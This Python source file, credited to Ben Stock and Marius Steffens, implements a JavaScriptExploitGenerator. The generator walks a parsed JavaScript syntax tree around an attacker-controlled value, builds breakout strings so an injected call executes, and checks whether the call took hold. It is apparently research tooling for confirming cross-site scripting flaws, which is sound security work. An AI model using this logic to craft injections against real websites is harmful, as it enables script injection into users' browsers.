# Copyright (C) 2019 Ben Stock & Marius Steffens
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.

# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

import pyesprima
import hashlib
from breakouts import BREAKOUT


class JavaScriptExploitGenerator:
    def __init__(self):
        self.parents = dict()
        self.nodelist = list()
        self.nodedir = dict()

    def reset(self):
        """
        Reset the state of the JavaScriptExploitGenerator.
        :return:
        """
        self.parents = dict()
        self.nodelist = list()
        self.nodedir = dict()

    def find_tainted_path(self, tainted_start, tainted_end):
        """
        Find the Path to the tainted values collecting the nodes which need to be considered when generating the
        breakout sequence.
        :param tainted_start: offset at which the tainted value starts
        :param tainted_end: offset at which the tainted value ends
        :return: path of the nodes which are important for the context, offset where our controlled value start, ends
        """
        path = []
        controlled_start, controlled_end = 0, 0
        for node in self.nodelist:
            node_range, node_type, node_hash = node
            node_start, node_end = node_range
            if node_range[0] >= tainted_start and node_range[1] <= tainted_end:
                if node_range[1] - node_range[0] < 3:
                    continue
                if node_type not in ('ObjectExpression', 'ArrayExpression', 'BlockStatement'):
                    path.append(node_hash)
                parent_hash = self.parents[node_hash]
                while parent_hash:
                    path.append(parent_hash)
                    parent_hash = self.parents[parent_hash]
                controlled_start, controlled_end = node_range
                break
            elif node_type in ('Identifier', 'Literal') and node_start <= tainted_start and node_end >= tainted_end:
                parent_hash = self.parents[node_hash]
                path.append(node_hash)
                while parent_hash:
                    path.append(parent_hash)
                    parent_hash = self.parents[parent_hash]
                controlled_start = max(node_start, tainted_start)
                controlled_end = min(node_end, tainted_end)
                break
        return path, controlled_start, controlled_end

    def create_exploit_from_path(self, path, start, end, original_source):
        """
        Generates the breakout sequence given the current context.
        :param path: path of nodes which depict current context
        :param start: offset at which the controlled value starts
        :param end: offset at which the controlled value ends
        :param original_source: complete value which ended up in the sink
        :return: breakout sequence for the current context
        """
        breakout = ""
        for node_index, node_hash in enumerate(path):
            element = self.nodedir[node_hash]
            parent_hash = self.parents[node_hash]
            node_start, node_end = element["range"]
            original_value = original_source[node_start:node_end]

            if element["type"] in ('Literal', 'Identifier'):
                if isinstance(element["value"], str) or isinstance(element["value"], unicode):
                    if end < element["range"][1]:
                        # we do not control the quote
                        breakout += element["raw"][-1]
                if isinstance(element["value"], pyesprima.pyesprima.RegExp):
                    if end < element["range"][1]:
                        breakout += element["raw"][0]
                # Special case for properties
                parent_hash = self.parents[node_hash]
                parent_node = self.nodedir[parent_hash]
                if parent_node["type"] == 'Property':
                    parent_property_key_hash = hashlib.md5(str(parent_node["key"])).hexdigest()
                    if parent_property_key_hash == node_hash:
                        breakout += ":1"
                if parent_node["type"] == 'AssignmentExpression':
                    parent_property_key_hash = hashlib.md5(str(parent_node["left"])).hexdigest()
                    if parent_property_key_hash == node_hash:
                        breakout += ":1"
            elif element["type"] == 'ReturnStatement':
                if original_value[7] == "(":
                    breakout += ")"
            elif element['type'] == 'ForStatement':
                child_node = self.nodedir[path[node_index - 1]]
                if child_node == element['init']:
                    breakout += 'undefined;false'
                breakout += '){}'
            elif element["type"] == 'SequenceExpression':
                if original_value[0] == "(":
                    breakout += ")"
            elif element["type"] == 'BinaryExpression':
                child_node = self.nodedir[path[node_index - 1]]
                if child_node == element["left"]:
                    breakout += "!= undefined"
                parent_node = self.nodedir[parent_hash]
                # if parent_node["type"] == 'LogicalExpression':
                #    breakout += ")"
                node_start, node_end = element["range"]
                original_value = original_source[node_start:node_end]
                if original_value[0] == "(":
                    breakout += ")"
            elif element["type"] == 'ConditionalExpression':
                # foo ? bar : bla
                child_node = self.nodedir[path[node_index - 1]]
                if child_node == element["consequent"]:
                    breakout += ":1"
            elif element["type"] == 'FunctionExpression':
                # Special case for (function (){foo})()
                parent_node = self.nodedir[self.parents[node_hash]]
                if parent_node["type"] not in ('CallExpression',):
                    breakout += BREAKOUT[element["type"]]
            elif element["type"] == 'IfStatement':
                child_node = self.nodedir[path[node_index - 1]]
                if child_node == element["alternate"] or child_node == element["consequent"]:
                    breakout += ";"
                elif child_node == element["test"] and child_node["type"] != 'LogicalExpression':
                    breakout += ");"
                elif child_node == element["test"] and child_node["type"] == 'LogicalExpression':
                    breakout += ");"
                    # if child_node == element[""]
            elif element["type"] == 'ObjectExpression':
                # Special case for (function (){foo})()
                parent_node = self.nodedir[self.parents[node_hash]]
                breakout += BREAKOUT[element["type"]]
            elif element["type"] == 'CallExpression':
                child_node = self.nodedir[path[node_index - 1]]
                # if child_node in element["arguments"]:
                #    breakout += ")"
                parent_node = self.nodedir[parent_hash]
                if end == element["callee"]["range"][1]:
                    breakout += "()"
                elif ((child_node["type"] not in ('MemberExpression', 'UnaryExpression')
                       and parent_node["type"] not in ('VariableDeclarator', 'UnaryExpression', 'ExpressionStatement'))
                      or child_node in element["arguments"]) and not original_value.startswith("function"):
                    breakout += BREAKOUT[element["type"]]
            elif element["type"] == 'MemberExpression':
                child_node = self.nodedir[path[node_index - 1]]
                if element["computed"] and child_node == element["property"]:
                    breakout += "]"
                elif element["object"]["type"] == 'FunctionExpression':
                    if element["property"]["range"][1] == end:
                        # tainted property
                        breakout += "();"
                        # (function(x) {}).apply()
                    else:
                        breakout += ");"

                breakout += BREAKOUT[element["type"]]
            elif element["type"] == 'ExpressionStatement':
                child_node = self.nodedir[path[node_index - 1]]
                if child_node["type"] not in ('CallExpression', 'MemberExpression'):
                    if original_value[0] == '(':
                        breakout += ");"
                else:
                    if child_node["type"] == 'CallExpression' and \
                            self.nodedir[path[node_index - 2]]["type"] == 'FunctionExpression' and \
                            self.nodedir[path[node_index - 2]]["range"][0] == 1:
                        breakout += ")"
                    else:
                        breakout += ";"
            elif element["type"] == 'NewExpression':
                if start > element["callee"]["range"][1]:
                    # we are injecting into the arguments
                    breakout += ")()"
                elif start == element["callee"]["range"][0] and end == element["callee"]["range"][1]:
                    breakout += "();"
                else:
                    breakout += ")"
            elif element["type"] in ('LogicalExpression',):
                child_node = self.nodedir[path[node_index - 1]]
                node_start, node_end = element["range"]
                original_value = ''
                if child_node['range'] == element['right']['range']:
                    if element['right']['range'][1] < node_end:
                        original_value = original_source[
                                         element['right']['range'][0] - 1:element['right']['range'][1] + 1]
                    else:
                        original_value = original_source[element['right']['range'][0]:element['right']['range'][1]]
                else:
                    if element['left']['range'][0] > node_start:
                        original_value = original_source[
                                         element['left']['range'][0] - 1:element['left']['range'][1] + 1]
                    else:
                        original_value = original_source[element['left']['range'][0]:element['left']['range'][1]]
                    # original_value = original_source[element['left']['range'][0]:element['left']['range'][1]]
                # original_value = original_source[node_start:node_end]
                tainted_value = original_source[start:end]
                if tainted_value != original_value and tainted_value in original_value:
                    end_of_taint = original_value.find(tainted_value) + len(tainted_value)
                    # if child_node != element["right"]:
                    #    breakout += original_value[end_of_taint:]
                if original_value[0] == "(":
                    breakout += ")"

            elif element["type"] == 'AssignmentExpression':
                parent_node = self.nodedir[parent_hash]
                # if parent_node["type"] == 'LogicalExpression':
                #    breakout += ")"
            else:
                breakout += BREAKOUT[element["type"]]
        return breakout

    def traverse_ast_generic(self, node, parent):
        """
        traverses the supplied node and its children populating internal structures.
        :param node: the node to investigate
        :param parent: (optional) parent node
        :return: None
        """
        if node is None:
            return
        if parent is not None:
            parent_hash = hashlib.md5(str(parent)).hexdigest()
        else:
            parent_hash = None

        node_type = node["type"]
        node_hash = hashlib.md5(str(node)).hexdigest()

        self.nodelist.append((node["range"], node_type, node_hash))
        assert node_hash not in self.nodedir
        self.nodedir[node_hash] = node
        assert node_hash not in self.parents
        self.parents[node_hash] = parent_hash

        keys = node.__dict__.keys()

        for key in keys:
            if key == 'range':
                continue
            if isinstance(node[key], list):
                for element in node[key]:
                    self.traverse_ast_generic(element, node)
            elif isinstance(node[key], pyesprima.pyesprima.jsdict):
                self.traverse_ast_generic(node[key], node)

    def check_for_js_exploit(self, payload):
        """
        Check whether inserted payloads are executable.
        :param payload: the payload to search for
        :return: bool indicating success or failure of the substitution
        """
        found_exploit = False
        for element in self.nodedir.values():
            if element["type"] == 'CallExpression' and element["callee"]["name"] == payload.split("(")[0]:
                found_exploit = True
        return found_exploit
